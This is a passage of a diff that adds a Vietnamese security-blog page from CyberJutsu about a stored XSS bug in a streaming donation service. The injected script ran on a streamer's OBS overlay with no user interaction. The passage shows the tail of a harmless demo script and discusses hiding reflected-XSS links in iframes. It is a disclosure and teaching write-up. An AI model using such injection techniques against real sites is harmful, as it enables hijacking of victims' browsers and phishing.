+                                        <span class="line">
+                                            <span class="javascript">$(element_ID).addClass(animation);</span>
+                                        </span>
+                                        <br>
+                                        <span class="line">
+                                            <span class="javascript">
+                                                <span class="keyword">var</span>
+                                                wait = <span class="built_in">window</span>
+                                                .setTimeout( 
+                                                <span class="function">
+                                                    <span class="keyword">function</span>
+                                                    (<span class="params"></span>
+                                                    )
+                                                </span>
+                                                &#123;
+                                            </span>
+                                        </span>
+                                        <br>
+                                        <span class="line">
+                                            <span class="javascript">
+                                                $(element_ID).removeClass(animation)&#125;, <span class="number">3000</span>
+                                            </span>
+                                        </span>
+                                        <br>
+                                        <span class="line">);</span>
+                                        <br>
+                                        <span class="line">&#125;</span>
+                                        <br>
+                                        <span class="line">
+                                            <span class="tag">
+                                                &lt;/<span class="name">script</span>
+                                                &gt;
+                                            </span>
+                                        </span>
+                                        <br>
+                                        <span class="line">
+                                            <span class="tag">
+                                                &lt;/<span class="name">body</span>
+                                                &gt;
+                                            </span>
+                                        </span>
+                                        <br>
+                                        <span class="line">
+                                            <span class="tag">
+                                                &lt;/<span class="name">html</span>
+                                                &gt;
+                                            </span>
+                                        </span>
+                                        <br>
+                                    </pre>
+                                </td>
+                            </tr>
+                        </table>
+                    </figure>
+                    <p>Ngay lập tức, BAM! trên màn hình của streamer đã hiện lên thông điệp donate và chạy script mình đã chèn vào. Từ đây như bạn biết XSS có thể bị lợi dụng để làm giả trang đăng nhập và làm một số thứ nguy hiểm hơn.</p>
+                    <p>Đây là màn hình quản lý lượng donate của một kênh stream. Mình đã che hết tất cả thông tin nhạy cảm, những lời thoại donate và số tiền ở bên dưới thì đều đã hiện public lên stream của họ rồi.</p>
+                    <p>
+                        <img src="/images/streamer-vs-xss/unghotoi_1.png">
+                    </p>
+                    <p>Qua bug này, chúng ta có thể thấy việc khai thác XSS không nhất thiết là phải click vào một đường link dài ngoằng nhìn rất nguy hiểm, mà tùy vào hoàn cảnh của lỗi mà chúng ta có rất nhiều cách setup để đối tượng có thể bị khai thác. Với trường hợp trên, OBS chương trình streaming cho phép chúng ta lồng một website vào đã vô tình tạo nên một bàn đạp để payload XSS có thể rơi vào streamer một cách chủ động mà họ không hề phải thực hiện bất kì thao tác gì. Thuật ngữ được gọi là “no user-interaction required”.</p>
+                    <p>
+                        Hoặc với những bug XSS khác, attacker cũng có thể lồng những payload đường link khai thác Reflected-XSS vào những <code>&lt;iframe &gt;</code>
+                        và nhúng nó ẩn vào bất kì đâu mà bạn dùng trình duyệt đi ngang qua chứ không nhất thiết phải gửi cho bạn một đường link dài dòng gì cả ;)
+                    </p>
+                    <p>
+                        Nhưng rất may mắn, ở thời điểm hiện tại, các trình duyệt tiên tiến như Google Chrome, Firefox, … đã dần thực hiện <code>SameSite by default</code>
+                        nhằm hạn chế những tác động của attack vector này.
+                    </p>
+                    <p>Ngoài ra, các bạn thử nghĩ xem những chương trình chat trực tuyến như Messenger, WhatsApp, Microsoft Teams, Skype,… mà bị XSS trong tin nhắn được gửi đi thì sẽ như thế nào?</p>
+                    <p>
+                        Nếu các bạn muốn biết nó là gì thì hãy comment ở trên post <a target="_blank" rel="noopener" href="https://www.facebook.com/CyberJutsu/posts/1409873056044812">facebook</a>
+                        để chúng mình biết có nên viết về nó không nhé!
+                    </p>
+                    <h2 id="Bonus">
+                        <a href="#Bonus" class="headerlink" title="Bonus">Bonus</a>
+                    </h2>
+                    <p>
+                        Mình cũng đã từng XSS vào kênh PewPew trên trang <code>talktv.vn</code>
+                        vào thời điểm 2013. Report đã được gửi cho TalkTV và trong một lần vô tình gặp Pew ở ngoài thì ảnh có lại bắt tay và hỏi “Ông là người hack kênh tôi à?” =))
+                    </p>
+                    <p>
+                        <img src="/images/streamer-vs-xss/talktv.jpg">
+                    </p>
+                    <p>Cheers / CyberJutsu - We make computer security easier to learn!</p>
+                </div>
+            </article>
+            <div id="footer-post-container">
+                <div id="footer-post">
+                    <div id="nav-footer" style="display: none">
+                        <ul>
+                            <li>
+                                <a href="/">home</a>
+                            </li>
+                            <li>
+                                <a href="/about/">about</a>
+                            </li>
+                            <li>
+                                <a href="/archives/">articles</a>
+                            </li>
+                            <li>
+                                <a target="_blank" rel="noopener" href="https://cyberjutsu.io/publications/">publications</a>
+                            </li>
+                        </ul>
+                    </div>
+                    <div id="toc-footer" style="display: none">
+                        <ol class="toc">
+                            <li class="toc-item toc-level-1">
+                                <a class="toc-link" href="#Mo-dau">
+                                    <span class="toc-number">1.</span>
+                                    <span class="toc-text">Mở đầu</span>
+                                </a>
+                                <ol class="toc-child">
+                                    <li class="toc-item toc-level-2">
+                                        <a class="toc-link" href="#Storyline">
+                                            <span class="toc-number">1.1.</span>
+                                            <span class="toc-text">Storyline</span>
+                                        </a>
+                                    </li>
+                                    <li class="toc-item toc-level-2">
+                                        <a class="toc-link" href="#XSS-co-bat-buoc-phai-click-vao-thu-gi-khong">
+                                            <span class="toc-number">1.2.</span>
+                                            <span class="toc-text">XSS có bắt buộc phải click vào thứ gì không?</span>
+                                        </a>
+                                    </li>
+                                    <li class="toc-item toc-level-2">
+                                        <a class="toc-link" href="#Moi-thu-bat-dau-tu-su-to-mo">
+                                            <span class="toc-number">1.3.</span>
+                                            <span class="toc-text">Mọi thứ bắt đầu từ sự tò mò</span>
+                                        </a>
+                                    </li>
+                                    <li class="toc-item toc-level-2">
+                                        <a class="toc-link" href="#The-bug">
+                                            <span class="toc-number">1.4.</span>
+                                            <span class="toc-text">The bug</span>
+                                        </a>
+                                    </li>
+                                    <li class="toc-item toc-level-2">
+                                        <a class="toc-link" href="#Bonus">
+                                            <span class="toc-number">1.5.</span>
+                                            <span class="toc-text">Bonus</span>
+                                        </a>
+                                    </li>
+                                </ol>
+                            </li>
+                        </ol>
+                    </div>
+                    <div id="share-footer" style="display: none">
+                        <ul>
+                            <li>
+                                <a class="icon" target="_blank" rel="noopener" href="http://www.facebook.com/sharer.php?u=https://blog.cyberjutsu.io/2021/06/02/IDOL-streamer-vs-XSS/">
+                                    <i class="fab fa-facebook fa-lg" aria-hidden="true"></i>
+                                </a>
+                            </li>
+                            <li>
+                                <a class="icon" target="_blank" rel="noopener" href="https://twitter.com/share?url=https://blog.cyberjutsu.io/2021/06/02/IDOL-streamer-vs-XSS/&text=IDOL STREAMER VS. XSS">
+                                    <i class="fab fa-twitter fa-lg" aria-hidden="true"></i>
+                                </a>
+                            </li>
+                            <li>
+                                <a class="icon" target="_blank" rel="noopener" href="http://www.linkedin.com/shareArticle?url=https://blog.cyberjutsu.io/2021/06/02/IDOL-streamer-vs-XSS/&title=IDOL STREAMER VS. XSS">
+                                    <i class="fab fa-linkedin fa-lg" aria-hidden="true"></i>
+                                </a>
+                            </li>
+                            <li>
+                                <a class="icon" target="_blank" rel="noopener" href="https://pinterest.com/pin/create/bookmarklet/?url=https://blog.cyberjutsu.io/2021/06/02/IDOL-streamer-vs-XSS/&is_video=false&description=IDOL STREAMER VS. XSS">
+                                    <i class="fab fa-pinterest fa-lg" aria-hidden="true"></i>
+                                </a>
+                            </li>
+                            <li>
+                                <a class="icon" href="mailto:?subject=IDOL STREAMER VS. XSS&body=Check out this article: https://blog.cyberjutsu.io/2021/06/02/IDOL-streamer-vs-XSS/">
+                                    <i class="fas fa-envelope fa-lg" aria-hidden="true"></i>
+                                </a>
+                            </li>
+                            <li>
+                                <a class="icon" target="_blank" rel="noopener" href="https://getpocket.com/save?url=https://blog.cyberjutsu.io/2021/06/02/IDOL-streamer-vs-XSS/&title=IDOL STREAMER VS. XSS">
+                                    <i class="fab fa-get-pocket fa-lg" aria-hidden="true"></i>
+                                </a>
+                            </li>
+                            <li>
+                                <a class="icon" target="_blank" rel="noopener" href="http://reddit.com/submit?url=https://blog.cyberjutsu.io/2021/06/02/IDOL-streamer-vs-XSS/&title=IDOL STREAMER VS. XSS">
+                                    <i class="fab fa-reddit fa-lg" aria-hidden="true"></i>
+                                </a>
+                            </li>
+                            <li>
+                                <a class="icon" target="_blank" rel="noopener" href="http://www.stumbleupon.com/submit?url=https://blog.cyberjutsu.io/2021/06/02/IDOL-streamer-vs-XSS/&title=IDOL STREAMER VS. XSS">
+                                    <i class="fab fa-stumbleupon fa-lg" aria-hidden="true"></i>
+                                </a>
+                            </li>
+                            <li>
+                                <a class="icon" target="_blank" rel="noopener" href="http://digg.com/submit?url=https://blog.cyberjutsu.io/2021/06/02/IDOL-streamer-vs-XSS/&title=IDOL STREAMER VS. XSS">
+                                    <i class="fab fa-digg fa-lg" aria-hidden="true"></i>
+                                </a>
+                            </li>
+                            <li>
+                                <a class="icon" target="_blank" rel="noopener" href="http://www.tumblr.com/share/link?url=https://blog.cyberjutsu.io/2021/06/02/IDOL-streamer-vs-XSS/&name=IDOL STREAMER VS. XSS&description=">
+                                    <i class="fab fa-tumblr fa-lg" aria-hidden="true"></i>
+                                </a>
+                            </li>
+                            <li>
+                                <a class="icon" target="_blank" rel="noopener" href="https://news.ycombinator.com/submitlink?u=https://blog.cyberjutsu.io/2021/06/02/IDOL-streamer-vs-XSS/&t=IDOL STREAMER VS. XSS">
+                                    <i class="fab fa-hacker-news fa-lg" aria-hidden="true"></i>
+                                </a>
+                            </li>
+                        </ul>
+                    </div>
+                    <div id="actions-footer">
+                        <a id="menu" class="icon" href="#" onclick="$('#nav-footer').toggle();return false;">
+                            <i class="fas fa-bars fa-lg" aria-hidden="true"></i>
+                            Menu
+                        </a>
+                        <a id="toc" class="icon" href="#" onclick="$('#toc-footer').toggle();return false;">
+                            <i class="fas fa-list fa-lg" aria-hidden="true"></i>
+                            TOC
+                        </a>
+                        <a id="share" class="icon" href="#" onclick="$('#share-footer').toggle();return false;">
+                            <i class="fas fa-share-alt fa-lg" aria-hidden="true"></i>
+                            Share
+                        </a>
+                        <a id="top" style="display:none" class="icon" href="#" onclick="$('html, body').animate({ scrollTop: 0 }, 'fast');">
+                            <i class="fas fa-chevron-up fa-lg" aria-hidden="true"></i>
+                            Top
+                        </a>
+                    </div>
+                </div>
+            </div>
+            <footer id="footer">
+                <div class="footer-left">Copyright &copy;2020-2021 - 
+    CyberJutsu Team
+  </div>
+                <div class="footer-right">
+                    <nav>
+                        <ul>
+                            <li>
+                                <a href="/">home</a>
+                            </li>
+                            <li>
+                                <a href="/about/">about</a>
+                            </li>
+                            <li>
+                                <a href="/archives/">articles</a>
+                            </li>
+                            <li>
+                                <a target="_blank" rel="noopener" href="https://cyberjutsu.io/publications/">publications</a>
+                            </li>
+                        </ul>
+                    </nav>
+                </div>
+            </footer>
+            <!-- Global site tag (gtag.js) - Google Analytics -->
+            <script async src="https://www.googletagmanager.com/gtag/js?id=UA-50645715-1"></script>
+            <script>
+                window.dataLayer = window.dataLayer || [];
+                function gtag() {
+                    dataLayer.push(arguments);
+                }
+                gtag('js', new Date());
+
+                gtag('config', 'UA-50645715-1');
+            </script>
+        </div>
+        <!-- styles -->
+        <link rel="stylesheet" href="/lib/font-awesome/css/all.min.css">
+        <link rel="stylesheet" href="/lib/justified-gallery/css/justifiedGallery.min.css">
+        <!-- jquery -->
+        <script src="/lib/jquery/jquery.min.js"></script>
+        <script src="/lib/justified-gallery/js/jquery.justifiedGallery.min.js"></script>
+        <!-- clipboard -->
+        <script src="/lib/clipboard/clipboard.min.js"></script>
+        <script type="text/javascript">
+            $(function() {
+                // copy-btn HTML
+                var btn = "<span class=\"btn-copy tooltipped tooltipped-sw\" aria-label=\"Copy to clipboard!\">";
+                btn += '<i class="far fa-clone"></i>';
+                btn += '</span>';
+                // mount it!
+                $(".highlight table").before(btn);
+                var clip = new ClipboardJS('.btn-copy',{
+                    text: function(trigger) {
+                        return Array.from(trigger.nextElementSibling.querySelectorAll('.code')).reduce((str,it)=>str + it.innerText + '\n', '')
+                    }
+                });
+                clip.on('success', function(e) {
+                    e.trigger.setAttribute('aria-label', "Copied!");
+                    e.clearSelection();
+                })
+            })
+        </script>
+        <script src="/js/main.js"></script>
+        <!-- search -->
+        <!-- Google Analytics -->
+        <!-- Baidu Analytics -->
+        <!-- Umami Analytics -->
+        <!-- Disqus Comments -->
+    </body>
 </html>
